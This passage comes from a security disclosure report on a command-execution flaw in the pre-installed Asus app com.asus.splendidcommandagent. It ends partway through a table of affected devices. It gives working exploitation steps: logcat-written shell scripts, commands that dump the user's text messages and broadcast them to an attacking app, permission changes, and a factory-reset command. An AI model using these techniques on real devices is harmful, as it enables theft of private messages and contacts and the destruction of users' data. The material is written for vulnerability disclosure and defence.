content query --uri content://contacts/people 
Set certain system properties (seems limited to persist.*) 
setprop persist.sys.diag.mdlog 1 
Change arbitrary settings 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
settings put secure install_non_market_apps 1 
Disabled third-party apps 
pm disable com.some.undesirable.app 
4.1 Executing Scripts as the system User 
The three instances of command execution as the system user that we found all use the 
java.lang.Runtime.exec(String) Application Programming Interface (API) call to execute commands. 
This API call executes a single command and does not allow input and output redirection that the shell 
provides. This behavior is limiting, so we created a method to have the app that allows command execution 
to execute shell scripts without reading them from the SD card. This relieves the attacking app from having 
to request the READ_EXTERNAL_STORAGE permission, although the attacking app can create the request to 
access external storage and use the vulnerable app to inject input events to grant it the permission if runtime 
permission granting is present on the device. Nonetheless, to be stealthier, the approach we outline below 
alleviates access to the SD card for certain data (recording the screen, text messages, contacts, call log, etc.). 
All devices allow a script written to the attacking app’s private directory to be executed by a platform app 
and for the output to be written directly to the attacking app’s private directory, except the Asus ZenFone 
V Live device. It’s vulnerable platform app will be blocked from reading from or writing to the attacking 
app’s private directory. Therefore, we provide two different methods for data transfer. Section 4.1.1 is the 
most robust and removes any difficulty with SELinux blocking a platform app reading from or writing to 
the attacking app’s private directory. Section 4.1.2 details the instance where the platform app is not 
prevented from writing directly to the attacking app’s private directory. 
4.1.1 Transferring Data Using a Dynamically-Registered Broadcast Receiver 
Our approach uses the logcat log to have the vulnerable platform app write a shell script to its private 
directory. First, the attacking app selects a random 12-character alphanumeric log tag (e.g., UQ2h9hVRhLfg) 
so that the vulnerable app will not read in log messages that are not intended for it. In addition, the attacking 
app should dynamically register a broadcast receiver with an action string of the selected 12 random 
character string. The attacking app then proceeds to write log messages with the selected log tag containing 
the lines of the script to execute. In the script, the attacking app needs to transfer the data obtained from the 
private directory of the vulnerable app to the private directory of the attacking app. This is accomplished 
by having the vulnerable app read in a file from its internal directory and sending it in an intent to the 
broadcast receiver that was dynamically registered by the attacking app. For example, the attacking app can 
write the following log messages to create a script that will make the vulnerable app send it the user’s text 
messages where -p  is the package name of the attacking app. The commands below uses 
the com.asus.splendidcommandagent app as an example. 
Log.d("UQ2h9hVRhLfg", "#!/bin/sh"); 
Log.d("UQ2h9hVRhLfg", "content query --uri content://sms > 
/data/data/com.asus.splendidcommandagent/msg.txt"); 
Log.d("UQ2h9hVRhLfg", "am broadcast -a UQ2h9hVRhLfg -p  --es data 
\"$(cat /data/data/com.asus.splendidcommandagent/msg.txt)\""); 
After writing these log messages which are the lines of the shell script to execute, the attacking app then 
makes the vulnerable app write the script to the vulnerable app’s private directory.  
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
logcat -v raw -b main -s UQ2h9hVRhLfg:* *:S -f 
/data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh -d 
The command above will only write the log messages excluding the log tags to a file in the vulnerable app’s 
private directory. In the example above of writing log messages to the logcat log, the corresponding file 
named /data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh will contain the content 
shown below. 
#!/bin/sh 
content query --uri content://sms > /data/data/com.asus.splendidcommandagent/msg.txt 
am broadcast -a UQ2h9hVRhLfg -p  --es data "$(cat 
/data/data/com.asus.splendidcommandagent/msg.txt)" 
In the logcat command to make the vulnerable app write the shell script to its private directory, the -v raw 
argument will only contain the log messages and not the log tags. The -b main argument will only contain 
the main log buffer and not include a message indicating the start of the system and main logs. The -s 
UQ2h9hVRhLfg:* *:S arguments will only write the log messages from the log tag of UQ2h9hVRhLfg and 
silence all other log messages without a log tag of UQ2h9hVRhLfg. The -d argument will make logcat dump 
the current messages in the targeted log buffer(s) and exit so that it does not keep reading. The -f 
/data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh argument will write the contents of 
the log to the file indicated. This command will write the script to the vulnerable app’s private directory. 
The attacking app can then have the vulnerable app make the shell script executable and then execute the 
shell script with the following commands. 
chmod 770 /data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh 
sh /data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh 
Then the attacking app can record the data it receives to its broadcast receiver that is dynamically-registered 
with an action of UQ2h9hVRhLfg to a file or send it out over a network socket to a remote server. 
4.1.2 Transferring Data Directly Using a File in the Attacking App’s Private Directory 
Certain device allow the vulnerable platform app write the output file directly into the attacking app’s 
private directory. This approach is similar to the previous approach although the data transfer approach is 
different. 
First, 
the 
attacking 
app 
needs 
to 
make 
their 
private 
directory 
(i.e., 
/data/data/the.attacking.app) globally executable. Then the attacking app needs to create the target 
file that will be written by the vulnerable app (i.e., msg.txt in this example). Then the msg.txt file needs 
to be set as globally writable. If the the file was not created first, the vulnerable app will create a file in the 
attacking app’s private directory that is owned by the system user and it will not be able to be read by the 
attacking app. Alternatively, the attacking app can have the platform app create the file in its private 
directory and then change the file permissions to be very permissive so it will be accessible to the attacking 
app (e.g., msg.txt). Creating the target file and changing the file permissions allows the attacking app to 
own the target file and will allow the vulnerable platform app to write to it.  
The attacking app selects a random 12-character alphanumeric log tag (e.g., UQ2h9hVRhLfg) in order to 
avoid a potential collision with any other apps that happen to use the same log tag. This example, will 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
achieve the same objective as the previous method in obtaining the user’s text messages. The attacking app 
then writes a shell script of its choosing to the logcat log using the log tag that was selected earlier.  
Log.d("UQ2h9hVRhLfg", "#!/bin/sh"); 
Log.d("UQ2h9hVRhLfg", "content query --uri content://sms > 
/data/data/the.attacking.app/msg.txt"); 
The attacking app then forces the vulnerable platform app to write the shell script to its private directory by 
making it execute the command shown below which writes the content of the log messages that the attacking 
app 
wrote 
to 
the 
log 
with 
the 
log 
tag 
of 
UQ2h9hVRhLfg. 
logcat -v raw -b main -s UQ2h9hVRhLfg:* *:S -f 
/data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh -d 
Then the attacking app makes the vulnerable platform app execute the shell script it just wrote to its private 
directory. The commands below make the vulnerable app change the file permissions on the shell script so 
it is executable and then execute the shell script. 
chmod 770 /data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh 
sh /data/data/com.asus.splendidcommandagent/UQ2h9hVRhLfg.sh 
The shell script will make the vulnerable platform app obtain all of the user’s text messages and write them 
to a file in the attacking app’s private directory (i.e., /data/data/the.attacking.app/msg.txt). At this 
point, the attacking app has the user’s text messages and can execute additional shell scripts using this 
method. This approach also works for recording the user’s screen and writing the logcat log directly to the 
private directory of the attacking app, although SELinux may deny the search operation on the app’s private 
directory on certain devices. 
4.2 Asus Command Execution Vulnerability Details 
The com.asus.splendidcommandagent platform app executes as the system user since it sets the 
android:sharedUserId attribute to a value of android.uid.system in its AndroidManifest.xml file 
and is signed with the device platform key. The SplendidCommandAgentService service application 
component within the com.asus.splendidcommandagent app executes with a process name of 
com.asus.services. This is a result of the SplendidCommandAgentService component setting the 
android:process attribute to a value of com.asus.services in its AndroidManifest.xml file. The 
output of the ps command below shows that the SplendidCommandAgentService component within the 
com.asus.splendidcommandagent app executes as the system user. 
adb shell ps | grep com.asus.services 
system    2049  612   1645812 58560 SyS_epoll_ 0000000000 S com.asus.services 
The SplendidCommandAgentService operates as a bound service where other apps interact with it using a 
pre-defined 
interface 
with 
a 
fully-qualified 
name 
of 
com.asus.splendidcommandagent.ISplendidCommandAgentService via RPCs. This interface exposes 
a single method named doCommand(String). In the com.asus.splendidcommandagent app, the 
com.asus.splendidcommandagent.c class fulfills the ISplendidCommandAgentService interface by 
containing an implementation for the single method defined in the interface. Therefore, a call to the 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
ISplendidCommandAgentService interface by the attacking app will be unmarshalled and delivered to the 
corresponding 
method 
in 
the 
com.asus.splendidcommandagent.c 
class 
in 
the 
com.asus.splendidcommandagent 
app. 
Although 
we 
lacked 
the 
AIDL 
file 
for 
the 
ISplendidCommandAgentService interface to generate an appropriate interface stub in our app to call 
directly, the single interface method can still be accessed without an interface stub. This is accomplished 
by binding to the SplendidCommandAgentService service, obtaining an IBinder reference, creating and 
populating the Parcel objects, and calling the appropriate transaction code when calling the 
IBinder.transact(int, Parcel, Parcel, int) method on the ISplendidCommandAgentService 
interface. 
This 
RPC 
on 
a 
remote 
object 
will, 
in 
turn, 
call 
the 
com.asus.splendidcommandagent.c.doCommand(String) 
method 
in 
the 
com.asus.splendidcommandagent 
app. 
The 
com.asus.splendidcommandagent.c.doCommand(String) 
method 
will 
call 
the 
SplendidCommandAgentService.a(SplendidCommandAgentService,String) method that performs 
the command execution using the java.lang.Runtime.exec(String) method. The string that is executed 
in the Runtime.exec(String) method call is controlled by the attacking app and is passed to the 
SplendidCommandAgentService via a string parameter in a Parcel object. Appendix A contains Proof of 
Concept (PoC) code for devices with a vulnerable com.asus.splendidcommandagent platform app to 
execute a command to programmatically factory reset the device. The command to programmatically 
factory reset the device is am broadcast -a android.intent.action.MASTER_CLEAR, although this 
command can be replaced with the commands in Section 4. The commands that can be executed will likely 
be affected by the major version of Android that the affected device is running. 
4.3 Affected Asus Android Devices 
Table 4 provides a sampling of Asus Android devices that contain a pre-installed, vulnerable version of the 
com.asus.splendidcommandagent 
platform 
app. 
A 
vulnerable 
version 
of 
the 
com.asus.splendidcommandagent app was also present on Asus Android tablet devices, except for the 
Asus ZenPad S 8.0 tablet. The com.asus.splendidcommandagent app (versionCode=1510200045, 
versionName=1.2.0.9_150915) on the Asus ZenPad S 8.0 tablet actually filtered the commands it 
received, and would only accept and execute the following commands: HSVSetting, GammaSetting, and 
DisplayColorSetting. At a certain point around March, 2017, this restriction was removed, and the 
com.asus.splendidcommandagent app would accept and execute any command without pre-condition 
other than it not be an empty string. We never saw any User ID (UID) checking or protection of the 
vulnerable service application component with a signature-level custom permission.  
Table 4. Asus Devices with a vulnerable com.asus.splendidcommandagent app. 
Device 
Status 
Build Fingerprint 
Asus ZenFone V 
Live (Verizon) 
Vulnerable 
asus/VZW_ASUS_A009/ASUS_A009:7.1.1/NMF26F/14.0610.1802.78-
20180313:user/release-keys 
Asus ZenFone 3 
Max 
Vulnerable 
asus/US_Phone/ASUS_X008_1:7.0/NRD90M/US_Phone-
14.14.1711.92-20171208:user/release-keys 
Asus ZenFone 3 
Ultra 
Vulnerable 
asus/JP_Phone/ASUS_A001:7.0/NRD90M/14.1010.1711.64-
20171228:user/release-keys 
Asus ZenFone 4 
Max 
Vulnerable 